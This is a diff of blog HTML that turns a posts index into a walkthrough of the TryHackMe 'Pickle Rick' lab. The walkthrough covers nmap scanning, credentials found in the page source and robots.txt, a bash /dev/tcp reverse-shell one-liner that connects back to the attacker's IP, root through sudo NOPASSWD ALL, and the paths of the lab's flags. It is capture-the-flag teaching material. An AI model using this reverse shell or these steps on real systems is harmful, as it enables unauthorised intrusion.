@@ -3,11 +3,11 @@
 <meta http-equiv="content-type" content="text/html">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 
-<title itemprop="name">Posts | Hackpuntes</title>
-<meta property="og:title" content="Posts | Hackpuntes" />
-<meta name="twitter:title" content="Posts | Hackpuntes" />
-<meta itemprop="name" content="Posts | Hackpuntes" />
-<meta name="application-name" content="Posts | Hackpuntes" />
+<title itemprop="name">TryHackMe - Machine - Pickle Rick v2 | Hackpuntes</title>
+<meta property="og:title" content="TryHackMe - Machine - Pickle Rick v2 | Hackpuntes" />
+<meta name="twitter:title" content="TryHackMe - Machine - Pickle Rick v2 | Hackpuntes" />
+<meta itemprop="name" content="TryHackMe - Machine - Pickle Rick v2 | Hackpuntes" />
+<meta name="application-name" content="TryHackMe - Machine - Pickle Rick v2 | Hackpuntes" />
 <meta property="og:site_name" content="Hackpuntes" />
 
 <meta name="description" content="Minimal Hugo blog theme with light and dark mode support">
@@ -18,22 +18,14 @@
 <meta property="og:locale" content="en-us" />
 <meta name="language" content="en-us" />
 
-  <link rel="alternate" hreflang="en-us" href="http://localhost:1313/posts/" title="English" />
+  <link rel="alternate" hreflang="en-us" href="http://localhost:1313/posts/thm-machine-pickle-rick-v2/" title="English" />
 
-  <link rel="alternate" hreflang="es" href="http://localhost:1313/es/posts/" title="Spanish" />
-
-
+  <link rel="alternate" hreflang="es" href="http://localhost:1313/es/posts/thm-machine-pickle-rick-v2/" title="Spanish" />
 
 
 
-    
-    
-    
-    
-    
-    <link rel="first" href="/posts/" />
-    <link rel="last" href="/posts/" />
-    
+
+
     
     
     
@@ -41,7 +33,7 @@
     <meta property="og:type" content="article" />
     <meta property="og:article:published_time" content=2025-11-17T00:00:00Z />
     <meta property="article:published_time" content=2025-11-17T00:00:00Z />
-    <meta property="og:url" content="http://localhost:1313/posts/" />
+    <meta property="og:url" content="http://localhost:1313/posts/thm-machine-pickle-rick-v2/" />
 
     
     <meta property="og:article:author" content="Javier Olmedo" />
@@ -56,14 +48,14 @@
     {
         "@context": "http://schema.org",
         "@type": "Article",
-        "headline": "Posts",
+        "headline": "TryHackMe - Machine - Pickle Rick v2",
         "author": {
         "@type": "Person",
         "name": ""
         },
         "datePublished": "2025-11-17",
         "description": "",
-        "wordCount":  0 ,
+        "wordCount":  292 ,
         "mainEntityOfPage": "True",
         "dateModified": "2025-11-17",
         "image": {
@@ -81,26 +73,33 @@
 <meta name="generator" content="Hugo 0.145.0">
 
     
-    <meta property="og:url" content="http://localhost:1313/posts/">
+    <meta property="og:url" content="http://localhost:1313/posts/thm-machine-pickle-rick-v2/">
   <meta property="og:site_name" content="Hackpuntes">
-  <meta property="og:title" content="Posts">
-  <meta property="og:description" content="Minimal Hugo blog theme with light and dark mode support">
+  <meta property="og:title" content="TryHackMe - Machine - Pickle Rick v2">
+  <meta property="og:description" content="Hey hackers! 👋
+Today we’re diving into the Pickle Rick machine on TryHackMe. It’s a classic 🟩 Easy challenge, perfect for practicing web enumeration and basic privilege escalation.
+🚀 Before Starting Add the machine to the /etc/hosts file, check connectivity with ping, and create the working folders
+echo &#39;10.10.34.26\tpicklerick.thm&#39; | sudo tee -a /etc/hosts ping -c 1 picklerick.thm mkdir -p ~/thm/picklerick/{exploits,fuzz,http,nmap} cd ~/thm/picklerick/ 🔎 Reconnaissance Scan with nmap Check all ports that are open, detect the service and its version with nmap and generate all.html to see information.">
   <meta property="og:locale" content="en_us">
-  <meta property="og:type" content="website">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2025-11-17T00:00:00+00:00">
+    <meta property="article:modified_time" content="2025-11-17T00:00:00+00:00">
 
 
     
     
   <meta name="twitter:card" content="summary">
-  <meta name="twitter:title" content="Posts">
-  <meta name="twitter:description" content="Minimal Hugo blog theme with light and dark mode support">
+  <meta name="twitter:title" content="TryHackMe - Machine - Pickle Rick v2">
+  <meta name="twitter:description" content="Hey hackers! 👋
+Today we’re diving into the Pickle Rick machine on TryHackMe. It’s a classic 🟩 Easy challenge, perfect for practicing web enumeration and basic privilege escalation.
+🚀 Before Starting Add the machine to the /etc/hosts file, check connectivity with ping, and create the working folders
+echo &#39;10.10.34.26\tpicklerick.thm&#39; | sudo tee -a /etc/hosts ping -c 1 picklerick.thm mkdir -p ~/thm/picklerick/{exploits,fuzz,http,nmap} cd ~/thm/picklerick/ 🔎 Reconnaissance Scan with nmap Check all ports that are open, detect the service and its version with nmap and generate all.html to see information.">
 
 
     
 
-    <link rel="canonical" href="http://localhost:1313/posts/">
-    <link href="/posts/index.xml" rel="alternate" type="application/rss+xml" title="Hackpuntes">
-    <link href="/posts/index.xml" rel="feed" type="application/rss+xml" title="Hackpuntes">
+    <link rel="canonical" href="http://localhost:1313/posts/thm-machine-pickle-rick-v2/">
     <link href="/style.min.2d921c18cf1ec555ffc03d59a8adc211c402c68c930c27d6a0c306ab175a8d09.css" rel="stylesheet">
     <link href="/code-highlight.min.706d31975fec544a864cb7f0d847a73ea55ca1df91bf495fd12a177138d807cf.css" rel="stylesheet">
 
@@ -202,7 +201,7 @@ stroke-linejoin="round" class="feather feather-home">
                                     
                                         
                                         
-                                            <option id="en-us" value="http://localhost:1313/posts/" selected>EN-US
+                                            <option id="en-us" value="http://localhost:1313/posts/thm-machine-pickle-rick-v2/" selected>EN-US
                                             </option>
                                         
                                     
@@ -217,7 +216,7 @@ stroke-linejoin="round" class="feather feather-home">
                                     
                                         
                                         
-                                            <option id="es" value="http://localhost:1313/es/posts/">ES-ES</option>
+                                            <option id="es" value="http://localhost:1313/es/posts/thm-machine-pickle-rick-v2/">ES-ES</option>
                                         
                                     
                                 
@@ -238,243 +237,77 @@ stroke-linejoin="round" class="feather feather-home">
         </div>
     </nav>
 </div>
-<div class="wrapper list-page">
-    <header class="header">
-        <h1 class="header-title center">Posts</h1>
-    </header>
+
+<div class="wrapper post">
     <main class="page-content" aria-label="Content">
-        
-        
-        <h2 class="post-year">2025</h2>
+        <article>
+            <header class="header">
+                <h1 class="header-title">TryHackMe - Machine - Pickle Rick v2</h1>
+                
+                
+                
+                <div class="post-meta">
+                    <time datetime="2025-11-17T00:00:00&#43;00:00" itemprop="datePublished"> Nov 17, 2025 </time>
+                </div>
+                
+            </header>
+            
+            <div class="page-content">
+                <p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_banner.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_banner.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_banner.png"></a></p>
+<p>Hey hackers! 👋</p>
+<p>Today we’re diving into the <a href="https://tryhackme.com/room/picklerick">Pickle Rick machine</a> on TryHackMe. It’s a classic <strong>🟩 Easy</strong> challenge, perfect for practicing web enumeration and basic privilege escalation.</p>
+<h2 id="-before-starting">🚀 Before Starting</h2>
+<p><strong>Add</strong> the machine to the <code>/etc/hosts</code> file, <strong>check connectivity</strong> with <code>ping</code>, and <strong>create the working folders</strong></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s1">&#39;10.10.34.26\tpicklerick.thm&#39;</span> <span class="p">|</span> sudo tee -a /etc/hosts
+</span></span><span class="line"><span class="cl">ping -c <span class="m">1</span> picklerick.thm
+</span></span><span class="line"><span class="cl">mkdir -p ~/thm/picklerick/<span class="o">{</span>exploits,fuzz,http,nmap<span class="o">}</span>
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> ~/thm/picklerick/
+</span></span></code></pre></div><h2 id="-reconnaissance">🔎 Reconnaissance</h2>
+<h3 id="scan-with-nmap">Scan with nmap</h3>
+<p>Check <strong>all ports</strong> that are <strong>open</strong>, detect the service and its version with <code>nmap</code> and generate <code>all.html</code> to see information.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nmap -sTCV -p- -Pn -A -T4 --min-rate<span class="o">=</span><span class="m">1000</span> -vvv -oA ~/thm/picklerick/nmap/all picklerick.thm
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">xsltproc ~/thm/picklerick/nmap/all.xml &gt; ~/thm/picklerick/nmap/all.html
+</span></span></code></pre></div><p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_nmap.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_nmap.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_nmap.png"></a></p>
+<h3 id="-check-website">🌐 Check website</h3>
+<p>Open firefox to inspect website</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">firefox http://picklerick.thm <span class="p">&amp;</span>
+</span></span></code></pre></div><p>🕵️‍♂️ You can find a username in the source code.</p>
+<p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_website.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_website.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_website.png"></a></p>
+<p>A text string is also found when checking the robots.txt file, which could be the user&rsquo;s password.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="o">[</span>http://picklerick.thm/robots.txt<span class="o">](</span>http://picklerick.thm/robots.txt<span class="o">)</span>
+</span></span><span class="line"><span class="cl">xxxxxxxxxxxxxxxxx
+</span></span></code></pre></div><h2 id="-initial-access-foothold">🚪 Initial Access (Foothold)</h2>
+<p>It&rsquo;s clear there must be some kind of login panel or similar. We try the typical <code>login.php</code>, <code>access.php</code>, etc.</p>
+<p>I found <code>login.php</code>, we try with the 🔑 credentials we detected during reconnaissance and Boom&hellip; <strong>we&rsquo;re in!</strong></p>
+<p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_login.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_login.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_login.png"></a></p>
+<p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_access.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_access.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_access.png"></a></p>
+<h3 id="getting-a-reverse-shell">Getting a reverse shell</h3>
+<p>I was trying several payloads, finally I used the <a href="https://www.revshells.com/">Revshells</a> resource to generate a bash payload.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">bash -c <span class="s1">&#39;bash -i &gt;&amp; /dev/tcp/10.8.95.209/1337 0&gt;&amp;1&#39;</span>
+</span></span></code></pre></div><p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_001.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_001.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_001.png"></a></p>
+<p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_002.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_002.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_002.png"></a></p>
+<p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_003.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_003.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_003.png"></a></p>
+<h2 id="-privilege-escalation">🧗‍♂️ Privilege Escalation</h2>
+<p>When viewing the output of <code>sudo -l</code> we can see that any command can be run as sudo.</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">www-data@ip-10-10-34-26:/var/www/html$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> www-data on ip-10-10-34-26:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass,
+</span></span><span class="line"><span class="cl">    <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User www-data may run the following commands on ip-10-10-34-26:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL<span class="o">)</span> NOPASSWD: ALL
+</span></span></code></pre></div><p>Now that we are <code>root</code> we can display the contents of the <strong>three flags</strong> at:</p>
+<ul>
+<li>🥒 1st flag &gt; <code>cat /var/www/html/Sup3rS3cretPickl3Ingred.txt</code></li>
+<li>🥒 2nd flag &gt; <code>cat /home/rick/'second ingredients'</code></li>
+<li>🥒 3rd flag &gt; <code>sudo cat /root/3rd.txt</code></li>
+</ul>
+<p><a href="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_complete.png"><img src="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_complete.png" alt="/images/thm-machine-pickle-rick-v2/thm-machine-pickle-rick-v2_complete.png"></a></p>
 
-        
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/thm-machine-pickle-rick-v2/">TryHackMe - Machine - Pickle Rick v2</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2025-11-17T00:00:00Z">
-        17 Nov 2025
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/snyk_fetch_the_flag_timeoff/">Snyk Fetch The Flag - TimeOff</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2025-03-09T00:00:00Z">
-        9 Mar 2025
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/snyk_fetch_the_flag_coding_mountains/">Snyk Fetch The Flag - Coding Mountains</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2025-03-08T00:00:00Z">
-        8 Mar 2025
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/snyk_fetch_the_flag_clickityclack/">Snyk Fetch The Flag - ClickityClack</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2025-03-07T00:00:00Z">
-        7 Mar 2025
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/snyk_fetch_the_flag_science_100/">Snyk Fetch The Flag - Science 100</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2025-03-06T00:00:00Z">
-        6 Mar 2025
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/snyk_fetch_the_flag_ctf_101/">Snyk Fetch The Flag - CTF 101</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2025-03-05T00:00:00Z">
-        5 Mar 2025
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/snyk_fetch_the_flag_screaming_crying_throwing_up/">Snyk Fetch The Flag - Screaming Crying Throwing up</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2025-03-04T00:00:00Z">
-        4 Mar 2025
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/snyk_fetch_the_flag_unfurl/">Snyk Fetch The Flag - Unfurl</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2025-03-03T00:00:00Z">
-        3 Mar 2025
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/snyk_fetch_the_flag_zero_ex_six_one/">Snyk Fetch The Flag - Zero Ex Six One</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2025-03-02T00:00:00Z">
-        2 Mar 2025
-        
-    </time>
-</article>
-
-
-         
-
-        
-        
-        <h2 class="post-year">2021</h2>
-
-        
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/htb-machine-bountyhunter/">HTB Machine BountyHunter</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2021-11-25T00:00:00Z">
-        25 Nov 2021
-        
-    </time>
-</article>
-
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/htb-machine-explore/">HTB Machine Explore</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2021-10-30T00:00:00Z">
-        30 Oct 2021
-        
-    </time>
-</article>
-
-
-         
-
-        
-        
-        <h2 class="post-year">2020</h2>
-
-        
-
-        
-
-        <article class="post-item">
-    <h4 class="post-item-title">
-        <a href="/posts/create-your-own-log-free-vpn/">Create your own log-free VPN</a>
-    </h4>
-    
-    
-    
-    
-    <time class="post-item-meta" datetime="2020-11-24T00:00:00Z">
-        24 Nov 2020
-        
-    </time>
-</article>
-
-
-         
-
-         
-
-    </main>
-</div><footer class="footer">
+            </div>
+        </article></main>
+</div>
+<footer class="footer">
     <span class="footer_item"> </span>
     &nbsp;
 
